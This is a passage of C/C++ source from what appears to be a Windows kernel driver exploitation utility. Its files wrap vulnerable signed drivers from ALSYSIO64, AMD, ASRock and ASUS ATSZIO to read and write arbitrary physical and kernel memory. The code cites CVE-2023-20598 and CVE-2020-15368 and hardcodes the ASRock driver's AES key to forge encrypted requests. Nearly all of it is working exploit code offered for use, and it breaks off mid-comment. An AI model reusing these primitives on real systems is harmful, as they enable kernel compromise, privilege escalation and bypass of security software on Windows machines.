  0x10,0x10,0x10,0x02,0x10,0x00,0x00,0xc6,0xc8,0x02,0x02,0x02,0x02,0x06,0x00,
  0x04,0x00,0x02,0xff,0x00,0xc0,0xc2,0x01,0x01,0x03,0x03,0x03,0xca,0x40,0x00,
  0x0a,0x00,0x04,0x00,0x00,0x00,0x00,0x7f,0x00,0x33,0x01,0x00,0x00,0x00,0x00,
  0x00,0x00,0xff,0xbf,0xff,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0xff,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,
  0x00,0x00,0x00,0xbf,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7f,0x00,0x00,
  0xff,0x40,0x40,0x40,0x40,0x41,0x49,0x40,0x40,0x40,0x40,0x4c,0x42,0x40,0x40,
  0x40,0x40,0x40,0x40,0x40,0x40,0x4f,0x44,0x53,0x40,0x40,0x40,0x44,0x57,0x43,
  0x5c,0x40,0x60,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,0x40,
  0x40,0x40,0x64,0x66,0x6e,0x6b,0x40,0x40,0x6a,0x46,0x40,0x40,0x44,0x46,0x40,
  0x40,0x5b,0x44,0x40,0x40,0x00,0x00,0x00,0x00,0x06,0x06,0x06,0x06,0x01,0x06,
  0x06,0x02,0x06,0x06,0x00,0x06,0x00,0x0a,0x0a,0x00,0x00,0x00,0x02,0x07,0x07,
  0x06,0x02,0x0d,0x06,0x06,0x06,0x0e,0x05,0x05,0x02,0x02,0x00,0x00,0x04,0x04,
  0x04,0x04,0x05,0x06,0x06,0x06,0x00,0x00,0x00,0x0e,0x00,0x00,0x08,0x00,0x10,
  0x00,0x18,0x00,0x20,0x00,0x28,0x00,0x30,0x00,0x80,0x01,0x82,0x01,0x86,0x00,
  0xf6,0xcf,0xfe,0x3f,0xab,0x00,0xb0,0x00,0xb1,0x00,0xb3,0x00,0xba,0xf8,0xbb,
  0x00,0xc0,0x00,0xc1,0x00,0xc7,0xbf,0x62,0xff,0x00,0x8d,0xff,0x00,0xc4,0xff,
  0x00,0xc5,0xff,0x00,0xff,0xff,0xeb,0x01,0xff,0x0e,0x12,0x08,0x00,0x13,0x09,
  0x00,0x16,0x08,0x00,0x17,0x09,0x00,0x2b,0x09,0x00,0xae,0xff,0x07,0xb2,0xff,
  0x00,0xb4,0xff,0x00,0xb5,0xff,0x00,0xc3,0x01,0x00,0xc7,0xff,0xbf,0xe7,0x08,
  0x00,0xf0,0x02,0x00
};

```

`Source/Hamakaze/idrv/alcpu.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       ALSYSIO64.CPP
*
*  VERSION:     1.31
*
*  DATE:        14 Apr 2023
*
*  ALSYSIO64 driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/alcpu.h"

/*
* AlcReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI AlcReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ALCPU_READ_REQUEST request;

    request.PhysicalAddress.QuadPart = PhysicalAddress;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_ALCPU_READ_MEMORY,
        &request,
        sizeof(request),
        Buffer,
        NumberOfBytes);

}

/*
* AlcWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI AlcWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    ALCPU_WRITE_REQUEST* pRequest;
    SIZE_T size;
    ULONG value;

    value = FIELD_OFFSET(ALCPU_WRITE_REQUEST, Data) + NumberOfBytes;
    size = ALIGN_UP_BY(value, PAGE_SIZE);

    pRequest = (ALCPU_WRITE_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
        pRequest->Size = NumberOfBytes;
        RtlCopyMemory(&pRequest->Data, Buffer, NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_ALCPU_WRITE_MEMORY,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

```

`Source/Hamakaze/idrv/alcpu.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022
*
*  TITLE:       ALCPU.H
*
*  VERSION:     1.28
*
*  DATE:        01 Dec 2022
*
*  ALSYSIO64 driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define FILE_DEVICE_ALCPU     (DWORD)0x9C40

#define ALCPU_READ_MEMORY     (DWORD)0x986
#define ALCPU_WRITE_MEMORY    (DWORD)0x987

#define IOCTL_ALCPU_READ_MEMORY  \
	CTL_CODE(FILE_DEVICE_ALCPU, ALCPU_READ_MEMORY, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x9C402618

#define IOCTL_ALCPU_WRITE_MEMORY \
	CTL_CODE(FILE_DEVICE_ALCPU, ALCPU_WRITE_MEMORY, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x9C40261C

typedef struct _ALCPU_READ_REQUEST {
    PHYSICAL_ADDRESS PhysicalAddress;
    ULONG Size;
} ALCPU_READ_REQUEST, * PALCPU_READ_REQUEST;

typedef struct _ALCPU_WRITE_REQUEST {
    PHYSICAL_ADDRESS PhysicalAddress;
    ULONG Size;
    UCHAR Data[ANYSIZE_ARRAY];
} ALCPU_WRITE_REQUEST, * PALCPU_WRITE_REQUEST;

BOOL WINAPI AlcReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI AlcWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/amd.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       AMD.CPP
*
*  VERSION:     1.41
*
*  DATE:        04 Nov 2023
*
*  AMD drivers routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/amd.h"

/*
* RmValidatePrerequisites
*
* Purpose:
*
* Check if the current CPU vendor is AMD.
* This driver won't work on anything else as it has hard block on driver entry.
*
*/
BOOL RmValidatePrerequisites(
    _In_ KDU_CONTEXT* Context
)
{
    BOOL bResult;
    UNREFERENCED_PARAMETER(Context);

    bResult = supIsSupportedCpuVendor(CPU_VENDOR_AMD, CPU_VENDOR_AMD_LENGTH);

    if (!bResult)
        supPrintfEvent(kduEventError, "[!] Abort, AMD CPU is required.\r\n");

    return bResult;
}

/*
* RmReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI RmReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;

    RMDRV_REQUEST* pRequest;
    SIZE_T size;

    size = sizeof(RMDRV_REQUEST) + NumberOfBytes;
    pRequest = (RMDRV_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
        pRequest->Size = NumberOfBytes;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_AMDRM_READ_MEMORY,
            pRequest,
            sizeof(RMDRV_REQUEST),
            pRequest,
            (ULONG)size);

        if (bResult) {

            RtlCopyMemory(
                Buffer,
                RtlOffsetToPointer(pRequest, sizeof(RMDRV_REQUEST)),
                NumberOfBytes);

        }

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* RmWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI RmWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    RMDRV_REQUEST* pRequest;
    SIZE_T size;

    size = sizeof(RMDRV_REQUEST) + NumberOfBytes;

    pRequest = (RMDRV_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->PhysicalAddress.QuadPart = PhysicalAddress;
        pRequest->Size = NumberOfBytes;

        RtlCopyMemory(
            RtlOffsetToPointer(pRequest, sizeof(RMDRV_REQUEST)),
            Buffer,
            NumberOfBytes);

        bResult = supCallDriver(DeviceHandle,
            IOCTL_AMDRM_WRITE_MEMORY,
            pRequest,
            (ULONG)size,
            NULL,
            0);

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* PdFwReadVirtualMemory
*
* Purpose:
*
* Read virtual memory.
* CVE-2023-20598
*
*/
BOOL WINAPI PdFwReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PDFW_MEMCPY request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = Buffer;
    request.Source = (PVOID)Address;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_AMDPDFW_MEMCPY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* PdFwWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory.
* CVE-2023-20598
* 
*/
BOOL WINAPI PdFwWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    PDFW_MEMCPY request;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Destination = (PVOID)Address;
    request.Source = Buffer;
    request.Size = NumberOfBytes;

    return supCallDriver(DeviceHandle,
        IOCTL_AMDPDFW_MEMCPY,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

```

`Source/Hamakaze/idrv/amd.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       AMD.H
*
*  VERSION:     1.41
*
*  DATE:        04 Nov 2023
*
*  AMD drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define FILE_DEVICE_AMD_RM    (DWORD)0x8111
#define FILE_DEVICE_AMD_PDFW  (DWORD)0x8000

#define PDFW_MEMCPY_FUNC (DWORD)0x805

#define RM_READ_MEMORY  (DWORD)0xBC2
#define RM_WRITE_MEMORY (DWORD)0xBC3

#define IOCTL_AMDRM_READ_MEMORY  \
	CTL_CODE(FILE_DEVICE_AMD_RM, RM_READ_MEMORY, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x81112F08

#define IOCTL_AMDRM_WRITE_MEMORY \
	CTL_CODE(FILE_DEVICE_AMD_RM, RM_WRITE_MEMORY, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x81112F0C

#define IOCTL_AMDPDFW_MEMCPY \
	CTL_CODE(FILE_DEVICE_AMD_PDFW, PDFW_MEMCPY_FUNC, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x80002014

#pragma pack( push, 1 ) //strict sizeof 0xC
typedef struct _RMDRV_REQUEST {
    PHYSICAL_ADDRESS PhysicalAddress;
    ULONG Size;
   // UCHAR Data[ANYSIZE_ARRAY]; //not a part of this structure
} RMDRV_REQUEST, * PRMDRV_REQUEST;
#pragma pack( pop )

typedef struct _PDFW_MEMCPY {
    BYTE Reserved[16];
    PVOID Destination;
    PVOID Source;
    PVOID Reserved2;
    DWORD Size;
    DWORD Reserved3;
} PDFW_MEMCPY, * PPDFW_MEMCPY;

BOOL RmValidatePrerequisites(
    _In_ KDU_CONTEXT* Context);

BOOL WINAPI RmReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI RmWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PdFwWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI PdFwReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

```

`Source/Hamakaze/idrv/asrdrv.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       ASRDRV.CPP
*
*  VERSION:     1.43
*
*  DATE:        10 Nov 2023
*
*  ASRock driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/asrdrv.h"

//
// Based on CVE-2020-15368
//

#define ASROCK_AES_KEY          "C110DD4FE9434147B92A5A1E3FDBF29A"
#define ASROCK_AES_KEY_LENGTH   sizeof(ASROCK_AES_KEY) - sizeof(CHAR)

ULONG g_AsrReadPhysIOCTL;
ULONG g_AsrWritePhysIOCTL;

/*
* AsrEncryptDriverRequest
*
* Purpose:
*
* Encrypt ASRock driver request with AES.
*
*/
BOOL AsrEncryptDriverRequest(
    _In_ PUCHAR DriverRequest,
    _In_ ULONG RequestSize,
    _Inout_ PVOID* EncodedData,
    _Inout_ ULONG* EncodedSize
)
{
    BOOL bResult = FALSE;

    NTSTATUS status;

    ASRDRV_REQUEST request;
    ASRDRV_REQUEST_FOOTER* requestFooter;

    BCRYPT_ALG_HANDLE hAlgAes = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    HANDLE heapCNG = NULL;

    PBYTE pbCipherData = NULL;
    DWORD cbCipherData;
    DWORD cbResult = 0;

    BYTE encKey[32];

    RtlSecureZeroMemory(&request, sizeof(request));
    RtlSecureZeroMemory(&encKey, sizeof(encKey));
    request.SizeOfIv = sizeof(request.Iv);

    RtlFillMemory(request.Iv, sizeof(request.Iv), 69);
    RtlFillMemory(request.Key, sizeof(request.Key), 69);

    do {

        RtlCopyMemory(&encKey, ASROCK_AES_KEY, ASROCK_AES_KEY_LENGTH);
        RtlCopyMemory(&encKey[13], request.Key, sizeof(request.Key));

        heapCNG = HeapCreate(0, 0, 0);
        if (heapCNG == NULL)
            break;

        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(
            &hAlgAes,
            BCRYPT_AES_ALGORITHM,
            NULL,
            0)))
        {
            break;
        }

        if (!NT_SUCCESS(BCryptGenerateSymmetricKey(
            hAlgAes,
            &hKey,
            NULL,
            0,
            encKey,
            sizeof(encKey),
            0)))
        {
            break;
        }

        PUCHAR pbIv = (PUCHAR)HeapAlloc(heapCNG, HEAP_ZERO_MEMORY, request.SizeOfIv);
        if (pbIv) {

            RtlCopyMemory(pbIv, request.Iv, request.SizeOfIv);

            cbCipherData = RequestSize + 64;

            pbCipherData = (PBYTE)HeapAlloc(heapCNG, HEAP_ZERO_MEMORY, cbCipherData);
            if (pbCipherData) {

                status = BCryptEncrypt(hKey,
                    DriverRequest,
                    RequestSize,
                    NULL,
                    pbIv,
                    request.SizeOfIv,
                    pbCipherData,
                    cbCipherData,
                    &cbResult,
                    BCRYPT_BLOCK_PADDING);

                bResult = NT_SUCCESS(status);

            }

        }

    } while (FALSE);

    if (hKey != NULL)
        BCryptDestroyKey(hKey);

    if (hAlgAes != NULL)
        BCryptCloseAlgorithmProvider(hAlgAes, 0);

    if (bResult && cbResult && pbCipherData) {

        ULONG outSize = sizeof(ASRDRV_REQUEST) +
            cbResult +
            sizeof(ASRDRV_REQUEST_FOOTER);

        PBYTE result = (PBYTE)supHeapAlloc(outSize);

        if (result) {

            RtlCopyMemory(result, &request, sizeof(request));

            RtlCopyMemory(RtlOffsetToPointer(result, sizeof(ASRDRV_REQUEST)),
                pbCipherData,
                cbResult);

            requestFooter = (ASRDRV_REQUEST_FOOTER*)RtlOffsetToPointer(result,
                outSize - sizeof(ASRDRV_REQUEST_FOOTER));

            requestFooter->Size = cbResult;

            *EncodedData = result;
            *EncodedSize = outSize;
        }

    }

    if (heapCNG) HeapDestroy(heapCNG);

    return bResult;
}

/*
* AsrCallDriver
*
* Purpose:
*
* Call ASRock driver with encrypted context.
*
*/
BOOL AsrCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ ASRDRV_ARGS* Arguments
)
{
    ASRDRV_COMMAND command;
    PVOID pvEncryptedCommand = NULL;
    DWORD cbEncryptedCommand = 0;

    IO_STATUS_BLOCK ioStatus;

    BYTE outBuffer[PAGE_SIZE];

    RtlSecureZeroMemory(&command, sizeof(command));

    command.OperationCode = IoControlCode;
    RtlCopyMemory(&command.Arguments, Arguments, sizeof(ASRDRV_ARGS));

    if (!AsrEncryptDriverRequest((PUCHAR)&command,
        sizeof(command),
        &pvEncryptedCommand,
        &cbEncryptedCommand))
    {
        return FALSE;
    }

    RtlSecureZeroMemory(&outBuffer, sizeof(outBuffer));
    RtlSecureZeroMemory(&ioStatus, sizeof(ioStatus));

    NTSTATUS status = supCallDriverEx(DeviceHandle,
        IOCTL_ASRDRV_EXEC_DISPATCH,
        pvEncryptedCommand,
        cbEncryptedCommand,
        &outBuffer,
        sizeof(outBuffer),
        &ioStatus);

    return NT_SUCCESS(status);
}


/*
* AsrReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI AsrReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ASRDRV_ARGS args;

    RtlSecureZeroMemory(&args, sizeof(args));
    args.qwordArgs[0] = PhysicalAddress;
    args.dwordArgs[2] = NumberOfBytes;
    args.dwordArgs[3] = AsrGranularityDword;
    args.qwordArgs[2] = (DWORD64)Buffer;

    return AsrCallDriver(DeviceHandle,
        IOCTL_ASRDRV_READ_MEMORY,
        &args);
}

/*
* AsrWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI AsrWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ASRDRV_ARGS args;

    RtlSecureZeroMemory(&args, sizeof(args));
    args.qwordArgs[0] = PhysicalAddress;
    args.dwordArgs[2] = NumberOfBytes;
    args.dwordArgs[3] = AsrGranularityByte;
    args.qwordArgs[2] = (DWORD64)Buffer;

    return AsrCallDriver(DeviceHandle,
        IOCTL_ASRDRV_WRITE_MEMORY,
        &args);
}

/*
* RweReadPhysicalMemory
*
* Purpose:
*
* Read from the physical memory.
*
*/
BOOL WINAPI RweReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    ASR_RWE_REQUEST request;

    ULONG_PTR mapAddress = (PhysicalAddress & ~(PAGE_SIZE - 1));
    ULONG size = ALIGN_UP_BY(NumberOfBytes, PAGE_SIZE);
    PVOID data = (ASR_RWE_REQUEST*)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (data) {

        RtlSecureZeroMemory(&request, sizeof(request));

        request.Address.QuadPart = mapAddress;
        request.Size = size;
        request.Data = (PBYTE)data;
        request.Granularity = AsrGranularityDword;

        if (supCallDriver(DeviceHandle,
            g_AsrReadPhysIOCTL,
            &request,
            sizeof(request),
            &request,
            sizeof(request)))
        {
            RtlCopyMemory(Buffer, RtlOffsetToPointer(data, PhysicalAddress - mapAddress), size);
            bResult = TRUE;
        }

        supFreeLockedMemory(data, size);
    }

    return bResult;
}

/*
* RweWritePhysicalMemory
*
* Purpose:
*
* Write to the physical memory.
*
*/
BOOL WINAPI RweWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ASR_RWE_REQUEST request;

    request.Address.QuadPart = PhysicalAddress;
    request.Size = NumberOfBytes;
    request.Granularity = AsrGranularityByte;
    request.Data = (PBYTE)Buffer;

    return supCallDriver(DeviceHandle,
        g_AsrWritePhysIOCTL,
        &request,
        sizeof(request),
        &request,
        sizeof(request));
}

/*
* AsrRegisterDriver
*
* Purpose:
*
* Register AsRock driver.
*
*/
BOOL WINAPI AsrRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    ULONG DriverId = PtrToUlong(Param);

    UNREFERENCED_PARAMETER(DeviceHandle);

    g_AsrReadPhysIOCTL = IOCTL_RWDRV_READ_MEMORY;
    g_AsrWritePhysIOCTL = IOCTL_RWDRV_WRITE_MEMORY;

    switch (DriverId) {

    case IDR_ASROCKDRV3:
        g_AsrReadPhysIOCTL = IOCTL_RWDRV_READ_MEMORY_7N;
        g_AsrWritePhysIOCTL = IOCTL_RWDRV_WRITE_MEMORY_7N;
        break;
    }

    return TRUE;
}

```

`Source/Hamakaze/idrv/asrdrv.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2022 - 2023
*
*  TITLE:       ASRDRV.H
*
*  VERSION:     1.41
*
*  DATE:        11 Dec 2023
*
*  ASRock driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define ASRDRV_READ_MEMORY     (DWORD)0xA02
#define ASRDRV_WRITE_MEMORY    (DWORD)0xA03
#define ASRDRV_EXEC_DISPATCH   (DWORD)0xB00

#define IOCTL_ASRDRV_READ_MEMORY  \
	CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_READ_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_ASRDRV_WRITE_MEMORY \
	CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_WRITE_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_ASRDRV_EXEC_DISPATCH \
	CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_EXEC_DISPATCH, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

#define IOCTL_RWDRV_READ_MEMORY  \
	CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_READ_MEMORY, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x00222808

#define IOCTL_RWDRV_WRITE_MEMORY \
	CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_WRITE_MEMORY, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x0022280C

#define IOCTL_RWDRV_READ_MEMORY_7N  \
	CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_READ_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS) //0x0022E808

#define IOCTL_RWDRV_WRITE_MEMORY_7N \
	CTL_CODE(FILE_DEVICE_UNKNOWN, ASRDRV_WRITE_MEMORY, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS) //0x0022E80C


//
// Based on CVE-2020-15368
//

#pragma pack(push, 1)
typedef struct _ASRDRV_REQUEST {
    WORD Pad0;
    DWORD SizeOfIv;
    BYTE Iv[21];
    BYTE Key[16];
    BYTE Pad1[3];
} ASRDRV_REQUEST, * PASRDRV_REQUEST;

typedef struct _ASRDRV_REQUEST_FOOTER {
    ULONG Size;
    WORD Pad0;
} ASRDRV_REQUEST_FOOTER, * PASRDRV_REQUEST_FOOTER;

typedef enum _ASRDRV_MM_GRANULARITY {
    AsrGranularityByte = 0,
    AsrGranularityWord = 1,
    AsrGranularityDword = 2
} ASRDRV_MM_GRANULARITY;

typedef union _ASRDRV_ARGS {
    BYTE byteArgs[24];
    WORD wordArgs[12];
    DWORD dwordArgs[6];
    UINT64 qwordArgs[3];
} ASRDRV_ARGS;

typedef struct _ASRDRV_COMMAND {
    UINT OperationCode;
    INT Pad0;
    ASRDRV_ARGS Arguments;
} ASRDRV_COMMAND, * PASRDRV_COMMAND;
#pragma pack(pop)

//
// Original RWE layout.
//
typedef struct _ASR_RWE_REQUEST {
    PHYSICAL_ADDRESS Address;           //+0x00
    ULONG Size;                         //+0x08
    ASRDRV_MM_GRANULARITY Granularity;  //+0x0C
    PBYTE Data;                         //+0x10
} ASR_RWE_REQUEST, *PASR_RWE_REQUEST;

BOOL WINAPI AsrReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI AsrWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI RweReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI RweWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI AsrRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

```

`Source/Hamakaze/idrv/atszio.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       ATSZIO.CPP
*
*  VERSION:     1.13
*
*  DATE:        05 Feb 2022
*
*  ASUSTeK ATSZIO WinFlash driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/atszio.h"

//
// Based on ASUSTeK header and lib files
// https://github.com/DOGSHITD/SciDetectorApp/tree/master/DetectSciApp
//
// Another reference https://github.com/LimiQS/AsusDriversPrivEscala
//

/*
* AtszioMapMemory
*
* Purpose:
*
* Map physical memory through \Device\PhysicalMemory.
*
*/
PVOID AtszioMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _Out_ HANDLE* SectionHandle
)
{
    ULONG_PTR offset;
    ULONG mapSize;
    ATSZIO_PHYSICAL_MEMORY_INFO request;

    *SectionHandle = NULL;

    RtlSecureZeroMemory(&request, sizeof(request));

    offset = PhysicalAddress & ~(PAGE_SIZE - 1);
    mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

    request.Offset.QuadPart = offset;
    request.ViewSize = mapSize;

    if (supCallDriver(DeviceHandle,
        IOCTL_ATSZIO_MAP_USER_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        *SectionHandle = request.SectionHandle;
        return request.MappedBaseAddress;
    }

    return NULL;
}

/*
* AtszioUnmapMemory
*
* Purpose:
